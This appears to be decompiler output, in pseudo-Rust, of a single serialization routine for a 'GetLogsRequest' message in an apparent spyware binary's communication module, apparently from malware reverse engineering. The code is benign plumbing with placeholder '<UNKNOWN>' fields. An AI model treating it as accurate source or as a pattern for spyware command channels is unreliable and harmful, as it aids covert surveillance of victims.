fn spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::GetLogsRequest>::serialize(a0: u64, a1: i64, a2: &u64) -> long long {
    let v0: Result<struct48, struct13>;  // [bp-0x38]
    let v1: u32;  // [bp-0x34]
    let v2: void*;  // [bp-0x30], Other Possible Types: u64
    let v3: u8;  // [bp-0x28]

    v0 = <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(a2, "GetLogsRequest", 0);
    match v0 {
        Ok(_) => {
            return struct56 {
                field_0: v0 as i32
                field_4: v1
                field_8: v2
                field_16: v3
                field_17: <UNKNOWN>
                field_32: <UNKNOWN>
            };
        },
        Err(_) => {
            <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a0, v2, v3 as u32);
            return a0;
        },
    }
}
